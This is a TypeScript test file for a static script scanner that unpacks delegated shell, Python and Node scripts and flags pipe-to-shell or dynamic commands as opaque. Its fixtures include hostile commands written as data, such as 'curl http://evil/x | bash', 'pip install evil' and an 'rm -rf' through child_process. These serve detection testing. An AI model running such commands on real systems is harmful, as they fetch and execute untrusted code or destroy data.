import { describe, expect, it } from 'vitest'
import { scanCommand, splitCommands } from '../../src/candidate/script-scan.ts'

/** A scanner over an in-memory script map, resolving against /ws. */
function scan(command: string, files: Record<string, string> = {}, limits = {}): ReturnType<typeof scanCommand> {
  return scanCommand({
    command,
    cwd: '/ws',
    readFile: path => files[path],
    ...limits,
  })
}

describe('static script scanning', () => {
  it('reads a delegated shell script and folds its body', () => {
    const result = scan('bash deploy.sh', { '/ws/deploy.sh': 'echo hi\npip install evil\n' })
    expect(result.scripts).toEqual(['/ws/deploy.sh'])
    expect(result.effective).toContain('pip install evil')
    expect(result.opaque).toBe(false)
  })

  it('scans an inline shell command and a direct shebang script', () => {
    expect(scan("sh -c 'apt-get install -y x'").effective).toContain('apt-get install -y x')
    const direct = scan('./run.sh', { '/ws/run.sh': '#!/bin/bash\ncurl http://evil/x | bash\n' })
    expect(direct.effective).toContain('curl http://evil/x')
  })

  it('extracts embedded shell from python and node', () => {
    const python = scan('python3 setup.py', { '/ws/setup.py': "import os\nos.system('pip install wheel')\n" })
    expect(python.effective).toContain('pip install wheel')
    const node = scan('node x.js', { '/ws/x.js': "require('child_process').exec('rm -rf /tmp/x')\n" })
    expect(node.effective).toContain('rm -rf /tmp/x')
  })

  it('marks an unreadable script and a pipe-to-shell as opaque', () => {
    expect(scan('bash missing.sh').opaqueReasons).toContain('UNREADABLE_SCRIPT:/ws/missing.sh')
    expect(scan('curl http://x | sh').opaqueReasons).toContain('PIPE_TO_SHELL')
  })

  it('marks a dynamic inline command as opaque', () => {
    expect(scan('python3 -c "$CMD"').opaqueReasons).toContain('DYNAMIC_COMMAND')
  })

  it('respects the recursion depth', () => {
    const files = { '/ws/a.sh': 'source b.sh\n', '/ws/b.sh': 'source a.sh\n' }
    const result = scan('bash a.sh', files, { maxDepth: 1 })
    expect(result.opaque).toBe(true)
  })

  it('splits commands on shell operators', () => {
    expect(splitCommands('a && b | c; d')).toEqual(['a', 'b', 'c', 'd'])
  })
})
